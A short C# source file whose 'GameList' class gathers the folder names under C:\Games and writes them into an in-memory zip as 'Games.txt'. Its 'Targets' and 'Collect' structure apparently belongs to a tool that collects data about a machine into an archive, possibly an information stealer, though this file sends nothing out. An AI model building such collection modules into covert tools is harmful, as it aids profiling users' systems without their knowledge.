using Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Targets.Device
{
	public class GameList : ITarget
	{
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string gamesPath = @"C:\Games";

			// Prüfen ob Verzeichnis existiert
			if (!Directory.Exists(gamesPath))
				return;

			// Alle Unterverzeichnisse abrufen
			string[] gameDirectories = Directory.GetDirectories(gamesPath);

			if (gameDirectories == null || gameDirectories.Length == 0)
				return;

			// Nur die Ordnernamen extrahieren (nicht die vollen Pfade)
			List<string> gameNames = new List<string>();

			foreach (string fullPath in gameDirectories)
			{
				string folderName = Path.GetFileName(fullPath);
				if (!string.IsNullOrEmpty(folderName))
				{
					gameNames.Add(folderName);
				}
			}

			// Wenn keine Namen gefunden wurden, abbrechen
			if (gameNames.Count == 0)
				return;

			// Namen in Textdatei schreiben
			string fileContent = string.Join("\n", gameNames);
			zip.AddTextFile("Games.txt", fileContent);
		}
	}
}